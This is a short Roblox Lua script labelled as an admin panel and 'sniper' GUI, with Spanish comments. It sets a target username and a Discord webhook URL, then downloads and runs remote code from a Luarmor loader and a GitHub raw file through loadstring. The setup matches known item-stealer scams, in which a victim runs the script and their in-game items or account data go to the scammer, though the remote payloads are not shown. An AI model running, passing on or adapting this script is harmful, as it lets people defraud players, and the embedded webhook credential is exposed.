-- Mode: ADMINPANEL
getgenv().TARGET_USERNAME = "YKZ260"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1555411301948330068/v5tqGzinl5tR2CSTafUeAWU_EaL8lxoQNhTHKU3WLHeDxTpqEAsQnX2-EJQNLt2x2O5H"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

-- Cargando GUI SNIPER
task.spawn(function()
   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()
end)